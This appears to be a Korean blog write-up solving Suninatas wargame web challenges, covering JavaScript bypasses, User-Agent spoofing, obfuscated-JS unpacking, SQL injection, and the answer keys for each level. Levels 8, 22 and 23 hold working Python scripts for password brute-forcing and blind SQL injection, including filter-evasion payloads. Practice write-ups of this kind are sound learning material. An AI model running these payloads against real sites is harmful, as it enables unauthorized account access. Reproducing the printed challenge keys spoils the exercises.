---
title : "Suninatas Web"
excerpt : "Suninatas Web 1~8, 22, 23"
toc: true
toc_sticky: true
categories :
  - Suninatas
---

## level 1 
```jsp
<%
    str = Request("str")
    If not str = "" Then
        result = Replace(str,"a","aad")
        result = Replace(result,"i","in")
        result1 = Mid(result,2,2)
        result2 = Mid(result,4,6)
        result = result1 & result2
        Response.write result
        If result = "admin" Then
            pw = "????????"
        End if
    End if
%>
```
```
a -> aad
i -> in
2번째 글자부터 2글자 슬라이스
4번째 글자부터 6글자 슬라이스
그 후 두 개를 합침.

input :  ami
-> aadmi
-> aadmin
-> ad
-> min
-> admin
```
```
Authkey : k09rsogjorejv934u592oi
```

## level 2
```javascript
<input type="button" value="Join" style="width: 60" onclick="chk_form()">
function chk_form(){
		var id = document.web02.id.value ;
		var pw = document.web02.pw.value ;
		if ( id == pw )
		{
			alert("You can't join! Try again");
			document.web02.id.focus();
			document.web02.id.value = "";
			document.web02.pw.value = "";
		}
		else
		{
			document.web02.submit();
		}
	}
```
```
js코드를 id != pw로 바꾼 뒤 입력해주면 성공
```
```
Authkey : Bypass javascript
```

## level 3
```
Write articles in Notice Board!
```
```
메인화면에 notice 게시판이 있는데 write 버튼이 없음. 
Free에 가서 write를 눌러보니 url에 /write로 됨.
notice도 같을 것이라 판단하고 실행하여 성공.
```
```
Authkey : 1q2w3e4r5t6y7u8i9o0p
```

## level 4 
```
User-Agent : ~~
Auth key : ???
<!-- Hint : Make your point to 50 & 'SuNiNaTaS' -->
```
```
2가지가 있음. 
1.Burp suite로 User-Agent 변환  

2. 개발자도구로 Network condition에서 User-Agent 변환 
```
```
Authkey: Change your Us3r Ag3ent
```

## level 5
```
소스코드에 보면 javascript 코드가 있음.
javascript 코드 난독화. 
난독화는 그 코드를 document.write나 alert, console.log로 감싸면 볼 수 있다고 함. 
```
Javascript 난독화 기법 : <a href="https://4rgos.tistory.com/2" target="_blank">4rgos.tistory.com/2</a>  
Javascript 난독화 unpacker : <a href="https://freeseotool.org/javascript-unpacker" target="_blank">freeseotool.org/javascript-unpacker</a>  
```javascript
var digitArray=new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
function PASS(n)
	{
	var result='';
	var start=true;
	for(var i=32;
	i>0;
	)
		{
		i-=4;
		var digit=(n>>i)&0xf;
		if(!start||digit!=0)
			{
			start=false;
			result+=digitArray[digit]
		}
	}
	return(result==''?'0':result)
}
```
```
힌트에 있던 값을 넣어주면 됨.
> console.log(PASS(12342046413275659))
  9c43c20c
```
```
Authkey: Unp@cking j@vaScript
```

## level 6
ReadMe 게시글을 읽어보면 sql문이 있음.
```
"select szPwd from T_Web13 where nIdx = '3' and szPwd = '"&pwd&"'"
```
또한 소스코드를 확인해보니 javascript 코드가 있음.
```javascript
var cont = document.pwd_chk;
function fnChk_pwd() {
    if (cont.passwd.value == "") {
        alert("비밀번호를 입력하세요!");
        cont.passwd.focus();
    } else {
       cont.action = "secret.asp";
       cont.submit();
    }
}
```
```
szPwd를 가져오므로 sql injection으로 szPwd 값을 찾으면 됨. 
필터링 되는 값들을 제외하고 넣으면 아래와 같음.
input : ' or 1>0 -- x

성공하면 다음과 같이 나오게 됨.
auth_key is suninatastopofworld!
이제 게시글을 읽을 수 있다고 함.
그 후 코드를 확인해보니 아래와 같은 코드가 생성되고 해당 url에 가봄.
```
```javascript
<script language='javascript'>
    alert('Congratulation!!\n\auth_key is suninatastopofworld!\n\nNow, you can read this article.'); 
    opener.location.href='view.asp?idx=3&num=3&passcode=wkdrnlwnd'; 
    window.close()
</script>
```
```
가보니 KeyFinding이라 해서 소스를 보니 
<form method="post" name="KEY_HINT" action="Rome's First Emperor">라 써있음.

따라서 Key는 Augustus
```
```
Authkey : Augustus 
```

## level 7 
```javascript
function noEvent() {
    if (event.keyCode == 116 || event.keyCode == 9) {
       alert('No!');
       return false;
    }
    else if (event.ctrlKey && (event.keyCode = 78 || event.keyCode == 82)) {
       return false;
    }
}
document.onkeydown = noEvent;
<!-- Hint : Faster and Faster -->
```
```
keyCode == 9 : tab
keyCode == 116 : F5
tab이나 F5키를 누르면 NO!

keyCode == 78 : n
keyCode == 82 : r
ctrk+n, ctrl+r 누르면 false
```
```
힌트를 보면 Faster and Faster라고 써있음.
코드를 보면 아래와 같은 코드가 있음.
<form method="post" action="./web07_1.asp" name="frm">
    <input type="hidden" name="web07" value="Do U Like girls?">
    <input type="submit" value="YES">
따라서 YES를 계속해서 빠르게 눌러줘야 되는 듯함.
name="frm" 이므로 console창에 frm.submit();를 계속 입력해주다 보면 키가 나옴.
```
```
Authkey: G0Od d@y
```

## level 8
```
brute force 문제
<!-- Hint : Login 'admin' Password in 0~9999 -->
```
```python
import requests

url='http://suninatas.com/challenge/web08/web08.asp'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'ASPSESSIONIDQCDTTBSB':'[redacted]'}

for i in range(0,10000) :
    data={'id':'admin', 'pw':i}
    res=requests.post(url, data=data, headers=headers, cookies=cookies)
    if "Password Incorrect!" not in res.text :
        print("Password : {}".format(i)) # Password : 7707
        break
```
```
Authkey: l3ruteforce P@ssword
```

## level 22
```
Blind Sql injection 문제

Filtering keyword
select / Union / or / white space / by / having
from / char / ascii / left / right / delay / 0x 

<!-- Hint : guest / guest & Your goal is to find the admin's pw -->
```
```
ascii -> unicode로 대체

우선 비밀번호 길이를 구해보니 10이였음. -> len(pw)=10

이제 unicode를 통해 blind sql injection을 해주면 됨.
id=admin' and unicode(substring(pw,1,1))>1 -- &pw=1
```
```python
import requests

url='http://suninatas.com/challenge/web22/web22.asp'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'ASPSESSIONIDQCDTTBSB':'AOIFBMIDIJKNDAEHKNBOIKMH'}
pw=''
for i in range(1,11):
    for j in range(32,127) :
        payload={
            'id':"admin' and unicode(substring(pw,"+str(i)+",1))="+str(j)+" -- ", 
            'pw':'1'
        }
        res=requests.get(url, params=payload, headers=headers, cookies=cookies)
        if "False" not in res.text :
            pw+=chr(j)
            print("Password : {}".format(pw)) # Password : N1c3Bilnl)
            break
```
```
Authkey :  N1c3Bilnl)
```

## level 23
```
level 22와 동일한 문제

Filtering keyword
admin/ select / Union / by / having / substring
from / char / delay / 0x / hex / asc / desc ..........

<!-- Hint 2 : Bypass 'admin' string -->
```
```
하다가 필터링 걸리지 않았는데 no hack 떠서 보니 길이 제한있음.

id=adm'%2b'in' and len(pw)>1-- &pw=1 -> ok admin
id=adm'%2b'in' and left(pw,1)='v'--&pw=1 -> ok admin

left를 2로 해주면 no hack -> 길이 제한때문에 안됌.
우리는 첫 글자가 v라는 사실을 알고 있으므로 admin pw를 뽑을 수 있음.

처음엔 left로만 하다가 10글자까지 뽑아오니 길이제한 때문에 안됐음.
절반씩 뽑아서 붙이는 형태로 코드를 수정시켰음.
```
```python
import requests

url='http://suninatas.com/challenge/web23/web23.asp'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'ASPSESSIONIDQCDTTBSB':'[redacted]'}

pw_left='V'
pw_right=''
for i in range(2,7):
    for j in range(32,127) :
        payload={
        'id':"' or left(pw,"+str(i)+")='"+pw_left+chr(j)+"'--", 
        'pw':'1'
        }
        res=requests.get(url, params=payload, headers=headers, cookies=cookies)
        if "<b>OK" in res.text :
            pw_left+=chr(j)
            print("Password_left {}th: {}".format(i,pw_left))
            break

for i in range(1,7):
    for j in range(32,127) :
        payload={
        'id':"' or right(pw,"+str(i)+")='"+chr(j)+pw_right+"'--", 
        'pw':'1'
        }
        res=requests.get(url, params=payload, headers=headers, cookies=cookies)
        if "<b>OK" in res.text :
            pw_right=chr(j)+pw_right
            print("Password_right {}th: {}".format(13-i,pw_right))
            break      
            
print("Password : {}".format(pw_left+pw_right)) # V3RYHARDSQLI 

'''
사실 이렇게 풀면 비밀번호가 되는 경우의 수가 너무 많아서 
unicode 외의 구분 가능한 함수를 찾았으나 못찾았음..

인증이 안되어서 소문자로 인증하니 성공.
'''
```
```
Authkey : v3ryhardsqli
```
